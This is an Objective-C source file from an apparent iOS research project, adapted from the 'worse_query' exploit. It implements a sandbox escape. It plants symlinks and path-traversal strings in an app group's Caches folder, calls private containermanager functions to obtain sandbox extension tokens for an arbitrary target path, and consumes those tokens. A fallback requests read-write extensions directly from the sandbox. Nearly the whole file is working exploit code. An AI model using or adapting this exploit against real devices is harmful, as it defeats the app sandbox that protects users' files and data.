//
//  worse_query.m
//  IOSurfaceSafeProbe
//
//  Based on worse_query by Taj C (forcequit) - GPL-3.0
//  Modified with alternative sandbox activation, path traversal,
//  multiple flag/part combos, and sandbox_extension_issue_file_to_self fallback.
//

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "worse_query.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_token_fn)(void *);
typedef int (*container_activate_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);
typedef char *(*sandbox_extension_issue_file_fn)(const char *, const char *, uint32_t);

static void clean_symlink(NSString *group) {
    if (!group) return;
    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:group];
    if (groupRoot) {
        NSURL *caches = [groupRoot URLByAppendingPathComponent:@"Library/Caches"];
        [files removeItemAtURL:caches error:nil];
        [files createDirectoryAtURL:caches withIntermediateDirectories:NO attributes:nil error:nil];
    }
}

static NSString *buildTraversalPath(NSString *groupCachesPath, NSString *target) {
    NSArray *components = [groupCachesPath pathComponents];
    NSUInteger depth = components.count;
    NSMutableString *traversal = [NSMutableString string];
    for (NSUInteger i = 0; i < depth; i++) {
        [traversal appendString:@"../"];
    }
    NSString *stripped = target;
    while ([stripped hasPrefix:@"/"]) {
        stripped = [stripped substringFromIndex:1];
    }
    [traversal appendString:stripped];
    return traversal;
}

static int64_t try_consume_result(void *result,
                                  container_copy_token_fn copy_token,
                                  container_copy_token_fn copy_ext_token,
                                  container_activate_fn activate,
                                  sandbox_extension_consume_fn consume) {
    if (activate) {
        int r = activate(result);
        if (r == 0) {
            NSLog(@"[worse_query] activate_extension succeeded");
            return 1;
        }
    }
    if (copy_token) {
        char *token = copy_token(result);
        if (token) {
            int64_t h = consume(token);
            free(token);
            if (h > 0) {
                NSLog(@"[worse_query] copy_sandbox_token succeeded (handle %lld)", h);
                return h;
            }
        }
    }
    if (copy_ext_token) {
        char *token = copy_ext_token(result);
        if (token) {
            int64_t h = consume(token);
            free(token);
            if (h > 0) {
                NSLog(@"[worse_query] copy_sandbox_extension_token succeeded (handle %lld)", h);
                return h;
            }
        }
    }
    return -6;
}

static int64_t do_query(NSString *symlinkDest, NSString *caches, NSString *group,
                        uint64_t flags, uint64_t part,
                        NSFileManager *files,
                        container_query_create_fn query_create,
                        container_query_set_class_fn query_set_class,
                        container_query_set_identifiers_fn query_set_ids,
                        container_query_set_flags_fn query_set_flags,
                        container_query_set_part_fn query_set_part,
                        container_query_get_single_result_fn query_get_result,
                        container_query_free_fn query_free,
                        container_copy_token_fn copy_token,
                        container_copy_token_fn copy_ext_token,
                        container_activate_fn activate,
                        sandbox_extension_consume_fn consume) {
    [files removeItemAtPath:caches error:nil];
    if (![files createSymbolicLinkAtPath:caches withDestinationPath:symlinkDest error:nil]) return -4;

    void *query = query_create();
    if (!query) return -3;

    xpc_object_t identifier = xpc_string_create(group.UTF8String);
    query_set_class(query, 7);
    query_set_ids(query, identifier);
    query_set_part(query, part);
    query_set_flags(query, flags);

    void *result = query_get_result(query);
    if (!result) { query_free(query); return -5; }

    int64_t handle = try_consume_result(result, copy_token, copy_ext_token, activate, consume);
    query_free(query);
    return handle;
}

int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) {
            NSLog(@"[worse_query] lstat failed for: %@", target);
            return -255;
        }
    }

    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:group];
    if (!groupRoot) {
        NSLog(@"[worse_query] No container for group: %@", group);
        return -1;
    }
    NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;

    container_query_create_fn query_create = dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_ids = dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_result = dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = dlsym(mgr, "container_query_free");
    container_copy_token_fn copy_token = dlsym(mgr, "container_copy_sandbox_token");
    container_copy_token_fn copy_ext_token = dlsym(mgr, "container_copy_sandbox_extension_token");
    container_activate_fn activate = dlsym(mgr, "container_object_sandbox_extension_activate");
    sandbox_extension_consume_fn consume = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    NSLog(@"[worse_query] APIs: token=%d ext_token=%d activate=%d",
          copy_token != NULL, copy_ext_token != NULL, activate != NULL);

    if (!query_create || !query_set_class || !query_set_ids || !query_set_flags ||
        !query_set_part || !query_get_result || !query_free || !consume) {
        NSLog(@"[worse_query] Missing required APIs");
        dlclose(mgr);
        return -2;
    }

    uint64_t flags_a = alt_flags ? 0x0000000800000000ULL : 0x0000008000000000ULL;
    uint64_t flags_b = alt_flags ? 0x0000008000000000ULL : 0x0000000800000000ULL;
    uint64_t all_flags[] = {flags_a, flags_b};
    uint64_t all_parts[] = {3, 1, 2};

    int64_t best = -6;
    NSString *traversal = buildTraversalPath(caches, target);

    for (int fi = 0; fi < 2; fi++) {
        for (int pi = 0; pi < 3; pi++) {
            int64_t h = do_query(target, caches, group, all_flags[fi], all_parts[pi],
                                 files, query_create, query_set_class, query_set_ids,
                                 query_set_flags, query_set_part, query_get_result,
                                 query_free, copy_token, copy_ext_token, activate, consume);
            if (h > 0) { clean_symlink(group); dlclose(mgr); return h; }
            if (h > best) best = h;

            h = do_query(traversal, caches, group, all_flags[fi], all_parts[pi],
                         files, query_create, query_set_class, query_set_ids,
                         query_set_flags, query_set_part, query_get_result,
                         query_free, copy_token, copy_ext_token, activate, consume);
            if (h > 0) { clean_symlink(group); dlclose(mgr); return h; }
            if (h > best) best = h;
        }
    }

    clean_symlink(group);
    dlclose(mgr);
    return best;
}

int64_t worse_query_issue_self(NSString *target) {
    sandbox_extension_issue_file_fn issue = dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file_to_self");
    sandbox_extension_consume_fn consume = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!issue || !consume) {
        NSLog(@"[worse_query] sandbox_extension_issue_file_to_self not available");
        return -2;
    }

    const char *ext_classes[] = {
        "com.apple.app-sandbox.read-write",
        "com.apple.app-sandbox.read",
        "com.apple.sandbox.container",
    };

    for (int i = 0; i < 3; i++) {
        char *token = issue(ext_classes[i], target.fileSystemRepresentation, 0);
        if (token) {
            int64_t h = consume(token);
            free(token);
            if (h > 0) {
                NSLog(@"[worse_query] issue_file_to_self succeeded: %s (handle %lld)", ext_classes[i], h);
                return h;
            }
            NSLog(@"[worse_query] issue_file_to_self %s: consume returned %lld", ext_classes[i], h);
        } else {
            NSLog(@"[worse_query] issue_file_to_self %s: no token", ext_classes[i]);
        }
    }
    return -8;
}

void worse_query_release(int64_t handle) {
    if (handle <= 0) return;
    sandbox_extension_release_fn release_fn = dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_fn) release_fn(handle);
}
